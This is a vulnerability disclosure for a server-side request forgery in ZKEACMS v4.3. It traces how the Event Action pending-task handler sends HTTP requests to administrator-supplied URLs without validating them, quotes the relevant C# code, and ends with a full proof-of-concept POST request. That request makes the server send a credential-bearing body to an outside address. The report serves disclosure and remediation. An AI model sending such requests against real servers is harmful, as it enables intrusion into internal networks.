# Vendor

SeriaWei

# Product

ZKEACMS

# version

v4.3

# Download 

https://github.com/SeriaWei/ZKEACMS/releases

https://www.zkea.net/download

# Vulnerability

SSRF

# Description

The root cause of the vulnerability is that the Event Action system fully trusts administrator input and does not perform any verification of the URL when performing HTTP request operations. Specifically:

# Analysis

1. The Entry Point: The PendingTaskController

You initiated the attack by sending a POST request to /admin/pendingtask/edit/2. This request is handled by the Edit action in the PendingTaskController.

File: src/ZKEACMS.EventAction/Controllers/PendingTaskController.cs:25

```
[HttpPost, DefaultAuthorize(Policy = PermissionKeys.ManageEventNotification)]
public override IActionResult Edit(Models.PendingTaskEntity entity)
{
    // ... some status updates ...
    return base.Edit(entity); // The entity is saved to the database
}
```

When this action is called, the ASP.NET Core framework performs model binding. It takes the form fields from your request (Identifier, HandlerName, Data, etc.) and uses them to create a PendingTaskEntity object. The crucial part is that the Data field from your form, which contains a long JSON string, is saved as a property of this task entity in the database.

2. The Payload: A JSON Object, Not a String

The most important insight from your POC is that the Data field is not just a simple string; it is a JSON object that represents an HttpRequestContent C# object.

Your decoded Data payload is:
```
{
  "Url": "http://192.168.43.165:9986/111.txt",
  "Method": "POST",
  ...
}
```


3. The Trigger: The Background Task Executor

A separate background service in the application, the PendingTaskExecutor, periodically scans the database for tasks that need to be run. When it finds the task you just edited, it performs these steps:

It reads the HandlerName property and sees that it needs to use the HttpRequesetTaskHandler.
It reads the Data property (the JSON string).
This is the critical step: To pass the data to the handler, the executor deserializes the JSON string from the Data property directly into an HttpRequestContent object. At this moment, your malicious Url becomes a property of a C# object inside the server's memory.
4. The Vulnerable Action: The HttpRequesetTaskHandler

The PendingTaskExecutor now calls the SendAsync method on the HttpRequesetTaskHandler, passing it the HttpRequestContent object that was just created from your JSON.

File: src/ZKEACMS.EventAction/HttpParser/HttpRequesetTaskHandler.cs:34
```
public async Task<ErrorOr<string>> SendAsync(HttpRequestContent httpRequest)
{
    // THE FLAW: 'httpRequest.Url' contains the value you provided in the JSON.
    // There is no validation here to check if the URL is safe or internal.
    using (var response = await _httpClientFactory.CreateClient().SendAsync(httpRequest.ConvertToHttpRequestMessage()))
    {
        // ...
    }
}
```


The SendAsync method completely trusts the httpRequest object it received. It does not perform any validation on the httpRequest.Url property. It simply creates an HTTP client and instructs it to send a request to that URL.

Conclusion on the Cause:

The vulnerability is caused by the PendingTaskController allowing an administrator to save a serialized HttpRequestContent object with a malicious Url property. This object is then blindly trusted and executed by the HttpRequesetTaskHandler without any validation, leading to a classic Server-Side Request Forgery. The system was designed with the assumption that an administrator would not perform a malicious action, and it lacks the necessary security controls to prevent it.


Vulnerability Verification:

When there is no pending event, we need to manually triggerï¼š

<img width="1653" height="875" alt="image" src="https://github.com/user-attachments/assets/05d87770-2448-4aff-84b5-1d518f8bb973" />

Then we can modify the target address:
<img width="1618" height="820" alt="image" src="https://github.com/user-attachments/assets/d64a63ca-87f2-44f3-bf35-918224512261" />

After that, all SSRF requests only need to modify the content in the packet or modify the pending events:
<img width="1374" height="727" alt="image" src="https://github.com/user-attachments/assets/278abcb2-c32c-46fd-b85f-c0cc3988c1f2" />



# POC
```
POST /admin/pendingtask/edit/2 HTTP/1.1
Host: 192.168.43.165:5000
Cookie: XXX
Content-Type: application/x-www-form-urlencoded
Content-Length: 2748

Identifier=ssrc&HandlerName=HttpRequesetTaskHandler&Data=%7B%22Url%22%3A%22http%3A%2F%2F192.168.43.165%3A9985%2F111.txt%22%2C%22Method%22%3A%22POST%22%2C%22HttpVersion%22%3A%22HTTP%2F1.1%22%2C%22Headers%22%3A%7B%22Content-Type%22%3A%22application%2Fjson%22%7D%2C%22Cookies%22%3A%7B%7D%2C%22RequestBody%22%3A%22%7B%5Cn++%5C%22userID%5C%22%3A+%5C%22admin%5C%22%2C%5Cn++%5C%22passWord%5C%22%5C%22%3A+%5C%22admin%5C%22%5Cn%7D%22%7D&LogMessage=System.Net.Http.HttpRequestException%3A+Received+an+invalid+status+line%3A+%27%27.%0D%0A+++at+System.Net.Http.HttpConnection.ParseStatusLineCore%28Span%601+line%2C+HttpResponseMessage+response%29%0D%0A+++at+System.Net.Http.HttpConnection.ParseStatusLine%28HttpResponseMessage+response%29%0D%0A+++at+System.Net.Http.HttpConnection.SendAsync%28HttpRequestMessage+request%2C+Boolean+async%2C+CancellationToken+cancellationToken%29%0D%0A+++at+System.Net.Http.HttpConnection.SendAsync%28HttpRequestMessage+request%2C+Boolean+async%2C+CancellationToken+cancellationToken%29%0D%0A+++at+System.Net.Http.HttpConnectionPool.SendWithVersionDetectionAndRetryAsync%28HttpRequestMessage+request%2C+Boolean+async%2C+Boolean+doRequestAuth%2C+CancellationToken+cancellationToken%29%0D%0A+++at+System.Net.Http.RedirectHandler.SendAsync%28HttpRequestMessage+request%2C+Boolean+async%2C+CancellationToken+cancellationToken%29%0D%0A+++at+Microsoft.Extensions.Http.Logging.LoggingHttpMessageHandler.%3CSendCoreAsync%3Eg__Core%7C4_0%28HttpRequestMessage+request%2C+Boolean+useAsync%2C+CancellationToken+cancellationToken%29%0D%0A+++at+Microsoft.Extensions.Http.Logging.LoggingScopeHttpMessageHandler.%3CSendCoreAsync%3Eg__Core%7C4_0%28HttpRequestMessage+request%2C+Boolean+useAsync%2C+CancellationToken+cancellationToken%29%0D%0A+++at+System.Net.Http.HttpClient.%3CSendAsync%3Eg__Core%7C83_0%28HttpRequestMessage+request%2C+HttpCompletionOption+completionOption%2C+CancellationTokenSource+cts%2C+Boolean+disposeCts%2C+CancellationTokenSource+pendingRequestsCts%2C+CancellationToken+originalCancellationToken%29%0D%0A+++at+ZKEACMS.EventAction.HttpParser.HttpRequesetTaskHandler.SendAsync%28HttpRequestContent+httpRequest%29%0D%0A+++at+ZKEACMS.PendingTask.PendingTaskExecutor.ProcessAllPendingTaskAsync%28%29+in+%2Fbuild%2Fsrc%2FZKEACMS%2FPendingTask%2FPendingTaskExecutor.cs%3Aline+48&RetryCount=3&Status=1&ID=2&Title=&Description=&CreateBy=&CreatebyName=&CreateDate=09%2F04%2F2025+08%3A44%3A33&LastUpdateBy=admin&LastUpdateByName=ZKEASOFT&LastUpdateDate=09%2F04%2F2025+09%3A39%3A15&ActionType=UpdateAndExit&__RequestVerificationToken=xxx

```





